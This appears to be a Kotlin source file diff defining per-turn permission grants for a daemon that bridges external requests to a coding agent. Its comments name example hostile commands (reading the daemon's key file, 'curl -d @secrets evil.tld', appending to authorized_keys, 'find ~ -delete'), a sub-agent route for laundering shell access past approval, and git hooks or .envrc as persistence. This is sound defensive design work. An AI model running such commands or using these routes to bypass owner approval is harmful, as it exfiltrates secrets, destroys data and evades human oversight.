@@ -1,0 +1,102 @@
+package dev.ccpocket.daemon.bridge
+
+/**
+ * How much authority ONE externally submitted bridge request carries into its turn. A per-turn grant, armed
+ * at hand-off and revoked at TurnResult / process end — never a standing rule (issue #91's whole point:
+ * an approval must not become a blank cheque for later, attacker-supplied prompts).
+ *
+ * The three levels differ ONLY in how many human taps the request cost, and therefore in which walls stay
+ * standing. Nothing here widens WHAT a bridge can reach: the tier ceiling ([TierClamp]), the frame whitelist
+ * ([BridgeCaps]) and the workdir allow-list ([BridgeGuard]) apply identically at every level.
+ *
+ *  - [NONE] — the default. Every tool ask routes to the owner's phone (Bash first passing
+ *    BridgeCommandPolicy's deny/allow walls). This is what an unapproved request gets.
+ *  - [OWNER_APPROVED] (issue #190) — the owner READ this exact request on their phone and approved it, so
+ *    the resulting turn runs with no second layer of piecemeal approval. Because a human vetted the prompt
+ *    itself, this level deliberately also clears the Bash and path walls: the owner is the wall.
+ *  - [AUTO_TRUSTED] (issue #198) — the owner marked this CHAT trusted in advance, so a member's request runs
+ *    with NO per-request card. Nobody read the prompt, so this level authorizes ONLY the tools whose reach is
+ *    bounded by machinery rather than by a human reading the prompt: see [autoRunnable]. Everything else —
+ *    Bash above all — still routes to the owner. Fewer taps, not more reach: a trusted chat's ceiling stays
+ *    strictly BELOW that of a request the owner personally read.
+ */
+enum class BridgeGrant {
+    NONE,
+    OWNER_APPROVED,
+    AUTO_TRUSTED,
+    ;
+
+    /** True when the grant authorizes ordinary execution tools without a per-tool ask. */
+    val authorizes: Boolean get() = this != NONE
+
+    companion object {
+        /**
+         * The tools [AUTO_TRUSTED] may run with no owner card — a CLOSED allow-list, deliberately, because the
+         * property that makes this level safe is not "we blocked the bad things" but "everything here is
+         * confined by the workdir wall the daemon enforces on its own" (PermissionBridge's `outOfScopeTarget`,
+         * keyed on these tools' path arguments).
+         *
+         * Why the two obvious candidates are absent:
+         *
+         *  - **Bash.** Its gate ([dev.ccpocket.daemon.agent.BridgeCommandPolicy]) is a tiny provable ALLOW list,
+         *    a best-effort DANGEROUS blacklist, and ASK for everything else — and that blacklist is only
+         *    tolerable BECAUSE a bypassed entry falls through to ASK, where a human still decides. Promoting
+         *    ASK to ALLOW here would delete that backstop and hand a chat member arbitrary shell with no tap:
+         *    `cat ~/.cc-pocket/identity.json` (the daemon's own E2E + relay private keys — not a path the file
+         *    wall covers, and not a shape SecretRedactor masks), `curl -d @secrets evil.tld`, `>> authorized_keys`,
+         *    `find ~ -delete`. So Bash keeps its normal three-way verdict: proven-safe or owner-whitelisted runs,
+         *    DANGEROUS is refused, the ambiguous middle asks the owner. An owner who wants a specific command to
+         *    run untapped has the per-bridge `allowedCommands` list for exactly that — a grant they typed out.
+         *  - **Anything not listed** (MCP tools, WebFetch/WebSearch, a future or renamed file tool). The workdir
+         *    wall is keyed on the path arguments the daemon knows; a tool carrying none passes it VACUOUSLY. An
+         *    open-by-default rule would therefore silently hand over every configured MCP server and every
+         *    egress sink, and would quietly widen itself on the next CLI tool rename. Unknown ⇒ ask the owner.
+         *
+         * ExitPlanMode is excluded too (approving a plan is a human decision by contract), as is AskUserQuestion
+         * (its answer rides the verdict, so auto-allowing answers nothing) — both simply reach the owner.
+         *
+         * Tool NAME is a necessary but not sufficient condition: PermissionBridge additionally requires a
+         * resolved in-scope target for [SPECIFIC_FILE_TOOLS] and refuses targets that [executesForTheOwner].
+         */
+        fun autoRunnable(toolName: String): Boolean = toolName in AUTO_RUNNABLE_TOOLS
+
+        /** Tools that act on ONE named file, so "no resolved target" means the workdir wall proved nothing. */
+        val SPECIFIC_FILE_TOOLS = setOf("Read", "Write", "Edit", "MultiEdit", "NotebookEdit")
+
+        // declared after SPECIFIC_FILE_TOOLS on purpose: a companion initializes in declaration order, so
+        // referencing it above would build this set from a null
+        private val AUTO_RUNNABLE_TOOLS = SPECIFIC_FILE_TOOLS + setOf(
+            // search — path/pattern scoped by the same wall; an absent `path` legitimately means the session cwd
+            "Glob", "Grep",
+            // bookkeeping with no reach outside the session
+            "TodoWrite",
+        )
+        // DELIBERATELY ABSENT: `Task`. The argument for including it would be "a sub-agent's own tool calls come
+        // back through this same gate one by one, so spawning one grants nothing extra" — but nothing in this
+        // repo verifies that. scripts/probe-claude-wire.py's task scenario asserts the sub-agent's events are
+        // tagged and reported, NOT that a sub-agent's Bash raises its own `can_use_tool` control request. Every
+        // other member of the list is confined by a path argument the DAEMON inspects; Task would be confined by
+        // CLI behaviour we merely assume. If that assumption is false or drifts, "have a subagent run X"
+        // launders the whole shell hole back in with no card anywhere. One tap for a sub-agent is the right
+        // price until the probe pins it down.
+
+        /**
+         * True for an in-project file that EXECUTES on the owner's next interaction, so writing it unattended is
+         * a persistence primitive rather than a code change: git's own config and hooks (`core.pager`,
+         * `diff.external`, `pre-commit`) and the project's Claude Code settings (hooks). The bridge's own agent
+         * runs clean-room, but the OWNER's sessions in that project do not — nor does their terminal.
+         *
+         * Matched on path SEGMENTS of the resolved target, so `src/dotgit-notes.md` is unaffected while
+         * `.git/hooks/pre-commit`, `a/.claude/settings.json` and `.envrc` all match. These do not become
+         * forbidden — they become "ask the owner", which is the one tap this whole feature is trading away.
+         */
+        fun executesForTheOwner(target: String): Boolean {
+            val parts = target.replace('\\', '/').split('/').filter { it.isNotEmpty() }
+            if (parts.any { it == ".git" || it == ".claude" }) return true
+            return parts.lastOrNull() in ON_ACCESS_EXEC_FILES
+        }
+
+        // direnv runs this on the owner's next `cd` into the project — same class as a git hook
+        private val ON_ACCESS_EXEC_FILES = setOf(".envrc")
+    }
+}
